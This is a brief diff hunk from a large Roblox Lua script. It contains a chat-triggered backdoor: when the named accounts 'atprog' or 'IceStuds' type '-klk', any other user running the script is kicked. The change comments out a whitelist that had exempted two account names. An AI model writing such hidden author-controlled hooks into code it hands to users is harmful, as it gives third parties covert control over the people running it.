@@ -4156,9 +4156,9 @@ v.Chatted:Connect(function(msg)
                 end  
 
                 if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
-			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
+			--if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
 				game.Players.LocalPlayer:Kick("atprog kicked you from the game!")
-			end
+			--end
                 end  
 
 	        if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and v.Name == "Di33le2" then
